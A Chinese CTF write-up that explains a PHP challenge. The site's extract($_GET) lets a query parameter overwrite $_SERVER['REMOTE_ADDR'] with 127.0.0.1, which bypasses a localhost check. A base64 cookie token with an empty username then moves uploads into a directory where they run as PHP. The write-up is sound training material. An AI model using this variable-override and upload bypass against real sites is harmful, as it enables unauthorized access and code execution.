### 参数置空绕过

话不多说，直接上题（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/68196bba58cb8da5c8de8893.png)

扫描目录发现有个 `index.php.bak`

```php+HTML
<?php 
error_reporting(0);
$token = $_COOKIE['token'] ?? null;

if($token){
    extract($_GET);
    $token = base64_decode($token);
    $token = json_decode($token, true);


    $username = $token['username'];
    $password = $token['password'];
    $isLocal = false;
    
    if($_SERVER['REMOTE_ADDR'] == "127.0.0.1"){
        $isLocal = true;
    }

    if($isLocal){
        echo 'Welcome Back，' . $username . '!';
        if(file_exists('upload/' . $username . '/' . $token['filename'])){
            echo '<br>';
            echo '<img src="upload/' . $username . '/' . $token['filename'] .'" width="200">';
        } else {
            echo '请上传您高贵的头像。';
            $html = <<<EOD
            <form method="post" action="upload.php" enctype="multipart/form-data">
                <input type="file" name="file" id="file">
                <input type="submit" value="Upload">
            </form>
            EOD;
            echo $html;
        }
    } else {
        // echo "留个言吧";
        $html = <<<EOD
        <h1>留言板</h1>
        <label for="input-text">Enter some text:</label>
        <input type="text" id="input-text" placeholder="Type here...">
        <button onclick="displayInput()">Display</button>
        EOD;
        echo $html;
    }
} else {
    $html = <<<EOD
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h2>Login</h2>
    <form method="post" action="./login.php">
        <div>
            <label for="username">Username:</label>
            <input type="text" name="username" id="username" required>
        </div>
        <div>
            <label for="password">Password:</label>
            <input type="password" name="password" id="password" required>
        </div>
        <div>
            <input type="submit" value="Login">
        </div>
    </form>
</body>
</html>
EOD;
    echo $html;
}
?>

<script>
    function displayInput() {
      var inputText = document.getElementById("input-text").value;
      document.write(inputText)
    }
</script>
```

**主要功能流程：**

1. 获取 Cookie 中的 `token` 值

   ```php
   $token = $_COOKIE['token'] ?? null;
   ```

2. 解析 `token` 内容

   ```php
   $token = base64_decode($token);
   $token = json_decode($token, true);
   ```

3. 判断访问者是否为 `127.0.0.1`

   ```php
   if ($_SERVER['REMOTE_ADDR'] == "127.0.0.1")
   ```

4. 本地用户功能

   显示欢迎语；

   检查头像文件是否存在；

   若存在则展示头像；

   若不存在则提示上传表单（提交到 `upload.php`）

5. 远程用户功能：

   显示留言板（前端 HTML + JS 动态展示）

6. 未登录用户

   显示登录表单，提交至 `login.php`

**extract($_GET) 工作原理：**

```php
<?php
extract($_GET);
echo "Hello, $name!";
?>
```

请求：

```
http://example.com/index.php?name=Alice
```

结果：

```
Hello, Alice!
```

**变量污染攻击：**

```php
<?php
$token = "secure-token";
extract($_GET);
echo "Token is: $token";
?>
```

请求：

```
http://example.com/index.php?token=hacked
```

结果：

```
Token is: hacked
```

**`extract($GET);` 存在变量覆盖，可以利用这个把 `$SERVER['REMOTE_ADDR']` 覆盖成 `127.0.0.1`**

```
?_SERVER[REMOTE_ADDR]=127.0.0.1
```

首先登录

![](https://pic1.imgdb.cn/item/681acaf158cb8da5c8e1cc96.png)

然后污染找到文件上传点

![](https://pic1.imgdb.cn/item/681acb1658cb8da5c8e1ccf0.png)

上传成功后没有返回路径，在源码上可以看到这个

```php
if(file_exists('upload/' . $username . '/' . $token['filename']))
```

猜测文件上传到 `/upload/[username]/[filename]`，尝试发现是正确的

当存在 `username` 时，无论上传什么都不能被解析成 PHP 代码

把 `username` 置空，成功将文件上传到 upload 目录

```
token=eyJ1c2VybmFtZSI6IiIsInBhc3N3b3JkIjoiIn0=
```

![](https://pic1.imgdb.cn/item/687f6cab58cb8da5c8cb68b1.png)

